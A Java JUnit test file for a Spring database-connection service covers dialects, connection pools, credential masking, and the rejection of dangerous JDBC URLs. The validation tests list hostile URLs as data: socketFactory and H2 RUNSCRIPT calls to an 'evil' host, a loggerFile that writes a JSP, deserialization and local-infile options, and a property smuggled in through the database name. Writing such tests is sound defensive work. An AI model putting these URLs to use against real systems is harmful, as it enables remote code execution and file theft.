package com.LectorDBTemplate.PushDbTemplate.service;

import com.LectorDBTemplate.PushDbTemplate.service.dialect.*;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.cache.CacheManager;
import org.springframework.test.util.ReflectionTestUtils;

import javax.sql.DataSource;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

class DynamicDataSourceServiceTest {

    private CacheManager cacheManager;
    private DynamicDataSourceService dynamicDataSourceService;
    private DataSource initialDataSource;

    @BeforeEach
    void setUp() {
        cacheManager = mock(CacheManager.class);
        initialDataSource = mock(DataSource.class);

        dynamicDataSourceService = new DynamicDataSourceService(
                initialDataSource,
                cacheManager
        );
    }

    @Test
    void testDbDialectFactory() {
        assertEquals("SQLSERVER", DbDialectFactory.getByEngineType("SQLSERVER").getEngineType());
        assertEquals("POSTGRESQL", DbDialectFactory.getByEngineType("POSTGRESQL").getEngineType());
        assertEquals("MYSQL", DbDialectFactory.getByEngineType("MYSQL").getEngineType());
        assertEquals("MARIADB", DbDialectFactory.getByEngineType("MARIADB").getEngineType());
        assertEquals("ORACLE", DbDialectFactory.getByEngineType("ORACLE").getEngineType());
        assertEquals("SQLITE", DbDialectFactory.getByEngineType("SQLITE").getEngineType());
    }

    @Test
    void testDialectIdentifierWrapping() {
        DbDialect sqlServer = new SqlServerDialect();
        assertEquals("[dbo].[Users]", sqlServer.escapeTableName("dbo", "Users"));

        DbDialect postgres = new PostgreSqlDialect();
        assertEquals("\"public\".\"users\"", postgres.escapeTableName("public", "users"));

        DbDialect mysql = new MySqlDialect();
        assertEquals("`mydb`.`users`", mysql.escapeTableName("mydb", "users"));

        DbDialect mariadb = new MariaDbDialect();
        assertEquals("`mydb`.`users`", mariadb.escapeTableName("mydb", "users"));

        DbDialect oracle = new OracleDialect();
        assertEquals("\"HR\".\"EMPLOYEES\"", oracle.escapeTableName("HR", "EMPLOYEES"));

        DbDialect sqlite = new SqliteDialect();
        assertEquals("\"users\"", sqlite.escapeTableName("main", "users"));
    }

    @Test
    void testDialectPaginationClause() {
        DbDialect sqlServer = new SqlServerDialect();
        String sqlServerClause = sqlServer.buildPaginationSql("SELECT * FROM [dbo].[T] ORDER BY [id]", 20, 20);
        assertTrue(sqlServerClause.contains("OFFSET ? ROWS FETCH NEXT ? ROWS ONLY"));
        List<Object> sqlServerParams = new ArrayList<>();
        sqlServer.appendPaginationParams(sqlServerParams, 20, 20);
        assertEquals(2, sqlServerParams.size());
        assertEquals(20, sqlServerParams.get(0)); // offset
        assertEquals(20, sqlServerParams.get(1)); // limit

        DbDialect postgres = new PostgreSqlDialect();
        String pgClause = postgres.buildPaginationSql("SELECT * FROM \"users\" ORDER BY \"id\"", 15, 30);
        assertTrue(pgClause.contains("LIMIT ? OFFSET ?"));
        List<Object> pgParams = new ArrayList<>();
        postgres.appendPaginationParams(pgParams, 15, 30);
        assertEquals(2, pgParams.size());
        assertEquals(15, pgParams.get(0)); // limit
        assertEquals(30, pgParams.get(1)); // offset
    }

    @Test
    void testTestConnectionWithSqlite() {
        DynamicDataSourceService.ConnectionConfig config = new DynamicDataSourceService.ConnectionConfig(
                "SQLITE",
                null,
                null,
                ":memory:",
                null,
                null,
                null,
                null,
                Map.of()
        );

        DynamicDataSourceService.TestResult result = dynamicDataSourceService.testConnection(config);
        assertTrue(result.success());
        assertNotNull(result.message());
        assertTrue(result.latencyMs() >= 0);
        assertNotNull(result.databaseProduct());
    }

    @Test
    void testConnectToSqlite() {
        DynamicDataSourceService.ConnectionConfig config = new DynamicDataSourceService.ConnectionConfig(
                "SQLITE",
                null,
                null,
                ":memory:",
                null,
                null,
                null,
                null,
                Map.of()
        );

        DynamicDataSourceService.ConnectResult result = dynamicDataSourceService.connectTo(config);
        assertTrue(result.success());
        assertEquals("SQLITE", dynamicDataSourceService.getDialect().getEngineType());
    }

    // Hallazgo de auditoría: la URL JDBC se logueaba y se exponía sin sanitizar cuando traía
    // credenciales embebidas (customJdbcUrl es texto libre ingresado por el usuario, que puede
    // usar el formato de propiedades "password=..." o el formato userinfo "user:pass@host").
    @Test
    void sanitizeJdbcUrl_masksPasswordAndUserPropertyStyle() {
        String url = "jdbc:sqlserver://host:1433;databaseName=db;user=admin;password=s3cr3t!;encrypt=true";
        String sanitized = ReflectionTestUtils.invokeMethod(dynamicDataSourceService, "sanitizeJdbcUrl", url);
        assertFalse(sanitized.contains("s3cr3t!"));
        assertFalse(sanitized.contains("=admin"));
        assertTrue(sanitized.contains("encrypt=true"));
    }

    @Test
    void sanitizeJdbcUrl_masksUserinfoStyleCredentials() {
        String url = "jdbc:postgresql://admin:s3cr3t!@host:5432/mydb";
        String sanitized = ReflectionTestUtils.invokeMethod(dynamicDataSourceService, "sanitizeJdbcUrl", url);
        assertFalse(sanitized.contains("s3cr3t!"));
        assertFalse(sanitized.contains("admin:"));
        assertTrue(sanitized.contains("host:5432/mydb"));
    }

    // --- Auditoría 2026-11: ciclo de vida de pools al cambiar de conexión ---

    private static DynamicDataSourceService.ConnectionConfig sqliteMemory() {
        return new DynamicDataSourceService.ConnectionConfig("SQLITE", null, null, ":memory:", null, null, null, null, Map.of());
    }

    @SuppressWarnings("unchecked")
    private static java.util.Set<com.zaxxer.hikari.HikariDataSource> pendingCloses(DynamicDataSourceService svc) {
        return (java.util.Set<com.zaxxer.hikari.HikariDataSource>) ReflectionTestUtils.getField(svc, "pendingPoolCloses");
    }

    // Hallazgo crítico: el DataSource inicial de Spring (el mismo de Flyway y appJdbcTemplate,
    // donde viven las FKs personalizadas y las plantillas) se programaba para cerrarse al
    // conectar a otra BD desde el frontend; 30 s después la persistencia de la app moría.
    @Test
    void connectTo_neverSchedulesTheInitialSpringDataSourceForClosing() {
        com.zaxxer.hikari.HikariDataSource initial = new com.zaxxer.hikari.HikariDataSource();
        initial.setJdbcUrl("jdbc:sqlite::memory:");
        DynamicDataSourceService svc = new DynamicDataSourceService(initial, cacheManager);
        try {
            assertTrue(svc.connectTo(sqliteMemory()).success());

            assertFalse(pendingCloses(svc).contains(initial));
            assertFalse(initial.isClosed());
        } finally {
            svc.cleanup();
            assertFalse(initial.isClosed(), "cleanup() tampoco debe cerrar el DataSource gestionado por Spring");
            initial.close();
        }
    }

    @Test
    void connectTo_twice_schedulesThePreviousDynamicPoolForGracefulClose() {
        DynamicDataSourceService svc = new DynamicDataSourceService(initialDataSource, cacheManager);
        try {
            svc.connectTo(sqliteMemory());
            DataSource firstDynamic = svc.getDataSource();
            svc.connectTo(sqliteMemory());

            assertTrue(pendingCloses(svc).contains(firstDynamic));
            assertNotSame(firstDynamic, svc.getDataSource());
        } finally {
            svc.cleanup();
        }
    }

    @Test
    void cleanup_closesDynamicAndPendingPools() {
        DynamicDataSourceService svc = new DynamicDataSourceService(initialDataSource, cacheManager);
        svc.connectTo(sqliteMemory());
        var first = (com.zaxxer.hikari.HikariDataSource) svc.getDataSource();
        svc.connectTo(sqliteMemory());
        var second = (com.zaxxer.hikari.HikariDataSource) svc.getDataSource();

        svc.cleanup();

        assertTrue(first.isClosed());
        assertTrue(second.isClosed());
    }

    @Test
    void connectTo_failure_keepsPreviousConnectionAndDialectUntouched() {
        DynamicDataSourceService svc = new DynamicDataSourceService(initialDataSource, cacheManager);
        DataSource before = svc.getDataSource();
        String dialectBefore = svc.getDialect().getEngineType();

        var result = svc.connectTo(new DynamicDataSourceService.ConnectionConfig(
                "POSTGRESQL", "127.0.0.1", 1, "nada", "u", "p", null, null, Map.of()));

        assertFalse(result.success());
        assertSame(before, svc.getDataSource());
        assertEquals(dialectBefore, svc.getDialect().getEngineType());
        svc.cleanup();
    }

    @Test
    void connectTo_success_clearsEveryMetadataCache() {
        org.springframework.cache.Cache cache = mock(org.springframework.cache.Cache.class);
        when(cacheManager.getCacheNames()).thenReturn(List.of("tables", "columns"));
        when(cacheManager.getCache(anyString())).thenReturn(cache);

        dynamicDataSourceService.connectTo(sqliteMemory());

        verify(cache, times(2)).clear();
        dynamicDataSourceService.cleanup();
    }

    // Bug funcional: con engineType CUSTOM (lo que envía ConnectionModal.jsx), el driver se
    // resolvía siempre a SQL Server; "Probar" funcionaba pero "Conectar" fallaba con cualquier
    // otro motor.
    @Test
    void connectTo_customEngineWithNonSqlServerUrl_resolvesDriverFromUrl() {
        var result = dynamicDataSourceService.connectTo(new DynamicDataSourceService.ConnectionConfig(
                "CUSTOM", null, null, null, null, null, null, "jdbc:sqlite::memory:", Map.of()));

        assertTrue(result.success(), result.message());
        assertEquals("SQLITE", dynamicDataSourceService.getDialect().getEngineType());
        dynamicDataSourceService.cleanup();
    }

    @Test
    void testConnection_customEngine_succeedsForSupportedUrl() {
        var result = dynamicDataSourceService.testConnection(new DynamicDataSourceService.ConnectionConfig(
                "CUSTOM", null, null, null, null, null, null, "  jdbc:sqlite::memory:  ", Map.of()));

        assertTrue(result.success(), result.message());
    }

    @Test
    void testConnection_unreachableHost_returnsFailureInsteadOfThrowing() {
        var result = dynamicDataSourceService.testConnection(new DynamicDataSourceService.ConnectionConfig(
                "POSTGRESQL", "127.0.0.1", 1, "nada", "u", "p", null, null, Map.of()));

        assertFalse(result.success());
        assertEquals(0, result.latencyMs());
        assertNull(result.databaseProduct());
    }

    // --- Auditoría 2026-11: validación de URL JDBC (RCE / escritura de archivos vía driver) ---

    @org.junit.jupiter.params.ParameterizedTest
    @org.junit.jupiter.params.provider.ValueSource(strings = {
            "jdbc:postgresql://h:5432/db?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://evil/x.xml",
            "jdbc:postgresql://h:5432/db?sslmode=require&loggerFile=/tmp/pwn.jsp&loggerLevel=DEBUG",
            "jdbc:postgresql://h/db?sslfactory=x.Y",
            "jdbc:mysql://h:3306/db?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
            "jdbc:mysql://h:3306/db?allowLoadLocalInfile=true",
            "jdbc:mariadb://h:3306/db?allowLocalInfile=true",
            "jdbc:sqlserver://h:1433;databaseName=db;trustManagerClass=evil.Trust",
            "jdbc:sqlserver://h:1433;databaseName=db;SOCKETFACTORYCLASS=evil.Factory",
            "jdbc:sqlite:file.db?enable_load_extension=true"
    })
    void validateJdbcUrl_rejectsDangerousDriverProperties(String url) {
        assertNotNull(DynamicDataSourceService.validateJdbcUrl(url), url);
    }

    @org.junit.jupiter.params.ParameterizedTest
    @org.junit.jupiter.params.provider.ValueSource(strings = {
            "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://evil/x.sql'",
            "jdbc:derby:x;create=true",
            "http://localhost:8080",
            "   "
    })
    void validateJdbcUrl_rejectsUnsupportedOrEmptyUrls(String url) {
        assertNotNull(DynamicDataSourceService.validateJdbcUrl(url), url);
    }

    @org.junit.jupiter.params.ParameterizedTest
    @org.junit.jupiter.params.provider.ValueSource(strings = {
            "jdbc:sqlserver://localhost:1433;databaseName=CL3530BD01MAP;encrypt=true;trustServerCertificate=true",
            "jdbc:postgresql://h:5432/db?sslmode=prefer",
            "jdbc:mysql://h:3306/db?useSSL=false&serverTimezone=UTC",
            "jdbc:mariadb://h:3306/db",
            "jdbc:oracle:thin:@//h:1521/XEPDB1",
            "jdbc:sqlite::memory:"
    })
    void validateJdbcUrl_acceptsNormalUrlsOfEverySupportedEngine(String url) {
        assertNull(DynamicDataSourceService.validateJdbcUrl(url), url);
    }

    @Test
    void connectTo_propertyInjectedThroughDatabaseName_isRejectedWithoutOpeningPool() {
        // databaseName se concatena en la URL de SQL Server: "db;trustManagerClass=..." inyectaba
        // una propiedad del driver aunque el usuario no usara URL personalizada.
        var result = dynamicDataSourceService.connectTo(new DynamicDataSourceService.ConnectionConfig(
                "SQLSERVER", "localhost", 1433, "db;trustManagerClass=evil.Trust", "sa", "x", null, null, Map.of()));

        assertFalse(result.success());
        assertTrue(result.message().contains("trustManagerClass"));
        assertSame(initialDataSource, dynamicDataSourceService.getDataSource());
    }

    @Test
    void testConnection_dangerousCustomUrl_isRejectedBeforeAnyNetworkAccess() {
        var result = dynamicDataSourceService.testConnection(new DynamicDataSourceService.ConnectionConfig(
                "CUSTOM", null, null, null, null, null, null,
                "jdbc:postgresql://evil:5432/db?socketFactory=x.Y&socketFactoryArg=z", Map.of()));

        assertFalse(result.success());
        assertTrue(result.message().contains("socketFactory"));
    }

    // --- Resumen de conexión y presets ---

    @Test
    void getCurrentConnectionSummary_neverExposesPassword() {
        dynamicDataSourceService.connectTo(new DynamicDataSourceService.ConnectionConfig(
                "CUSTOM", null, null, null, "admin", "SuperSecreta1", null, "jdbc:sqlite::memory:", Map.of()));

        Map<String, Object> summary = dynamicDataSourceService.getCurrentConnectionSummary();

        assertFalse(summary.toString().contains("SuperSecreta1"));
        assertEquals(false, summary.get("hasError"));
        dynamicDataSourceService.cleanup();
    }

    @Test
    void getCurrentConnectionSummary_whenInitialConnectionFailed_reportsErrorFlag() throws Exception {
        DataSource broken = mock(DataSource.class);
        when(broken.getConnection()).thenThrow(new java.sql.SQLException("Connection refused"));

        DynamicDataSourceService svc = new DynamicDataSourceService(broken, cacheManager);
        Map<String, Object> summary = svc.getCurrentConnectionSummary();

        assertEquals(true, summary.get("hasError"));
        assertEquals("SQLSERVER", summary.get("engineType"));
    }

    @Test
    void getPresets_listsAllSixEnginesWithDefaultPorts() {
        var presets = dynamicDataSourceService.getPresets();

        assertEquals(6, presets.size());
        assertTrue(presets.stream().anyMatch(p -> "SQLSERVER".equals(p.get("engineType")) && Integer.valueOf(1433).equals(p.get("defaultPort"))));
        assertTrue(presets.stream().allMatch(p -> p.containsKey("driverClassName")));
    }

    @Test
    void maskJdbcUrl_masksPwdAlias() {
        String masked = DynamicDataSourceService.maskJdbcUrl("jdbc:mysql://h/db?user=root&pwd=topsecret");
        assertFalse(masked.contains("topsecret"));
        assertFalse(masked.contains("root"));
    }

    @Test
    void sanitizeJdbcUrl_handlesNullGracefully() {
        String sanitized = ReflectionTestUtils.invokeMethod(dynamicDataSourceService, "sanitizeJdbcUrl", (Object) null);
        assertEquals("N/A", sanitized);
    }
}
